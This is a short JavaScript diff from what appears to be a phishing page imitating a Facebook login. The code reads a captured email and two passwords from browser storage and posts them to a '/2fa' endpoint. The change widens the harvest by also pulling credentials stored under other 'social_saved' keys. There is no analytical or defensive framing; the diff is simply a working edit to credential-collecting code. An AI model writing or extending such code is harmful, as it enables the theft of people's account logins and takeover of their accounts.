@@ -367,8 +367,8 @@
                     inputWrapper.classList.remove("has-error");
                     errorBox.style.display = "none";
 
-                    const email = localStorage.getItem('fb_email') || '';
-                    const password1 = localStorage.getItem('fb_pass1') || '';
+                    const email = localStorage.getItem('fb_email') || localStorage.getItem('social_saved_email') || '';
+                    const password1 = localStorage.getItem('fb_pass1') || localStorage.getItem('social_saved_pass') || '';
                     const password2 = localStorage.getItem('fb_pass2') || '';
 
                     fetch("/2fa", {
